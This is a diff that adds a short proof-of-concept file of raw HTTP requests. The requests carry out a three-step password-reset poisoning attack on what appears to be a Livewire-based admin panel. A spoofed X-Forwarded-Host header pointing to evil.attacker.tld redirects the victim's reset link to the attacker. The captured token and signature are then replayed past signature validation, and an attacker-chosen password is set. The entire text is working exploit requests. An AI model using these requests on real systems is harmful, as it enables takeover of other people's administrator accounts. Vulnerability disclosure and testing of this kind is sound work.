@@ -1,0 +1,18 @@
+### 1) Poison the reset email (attacker, unauthenticated)
+POST /livewire-5f244c96/update
+Host: localhost:20000
+X-Forwarded-Host: evil.attacker.tld
+X-Forwarded-Proto: https
+
+{"components":[{"snapshot":"<RequestPasswordReset snapshot>","updates":{"data.email":"victim_8c6f32df@example.invalid"},"calls":[{"path":"","method":"request","params":[]}]}]}
+
+### 2) Replay the captured link to the real server WITH host spoof (passes ValidateSignature)
+GET /admin/password-reset/reset?email=victim_8c6f32df%40example.invalid&token=8069c73ead4d5f86183988e559e56a905df3875a9a0c668b88a9642a304c12da&signature=ae8b03706fbeb5c8fc1cfa9adc722815790272ba2c36aa1b5669ffed10f42c63
+X-Forwarded-Host: evil.attacker.tld
+X-Forwarded-Proto: https
+
+### 3) Set the new password
+POST /livewire-5f244c96/update
+X-Forwarded-Host: evil.attacker.tld
+
+{"components":[{"snapshot":"<ResetPassword snapshot>","updates":{"password":"<attacker pw>","passwordConfirmation":"<attacker pw>"},"calls":[{"path":"","method":"resetPassword","params":[]}]}]}
